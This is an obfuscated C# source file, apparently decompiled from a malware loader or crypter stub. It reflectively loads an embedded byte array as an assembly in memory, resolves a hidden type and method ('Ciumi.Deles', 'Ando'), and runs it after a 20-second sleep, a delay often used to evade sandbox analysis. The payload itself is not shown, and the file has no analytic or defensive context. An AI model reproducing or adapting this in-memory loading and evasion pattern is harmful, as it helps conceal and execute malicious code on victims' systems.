using System;
using System.Reflection;
using System.Threading;

namespace Y;

internal sealed class R
{
	internal delegate Assembly V(byte[] byte_0);

	internal delegate void Q();

	internal static Type I = ((V)Delegate.CreateDelegate(typeof(V), Y.L.E.GetMethod("Load", new Type[1] { typeof(byte[]) })))(Y.V.V).GetType("Ciumi.Deles");

	internal static Q S = (Q)Delegate.CreateDelegate(typeof(Q), I, "Ando");

	private static void L()
	{
		Thread.Sleep(20000);
		S();
	}
}
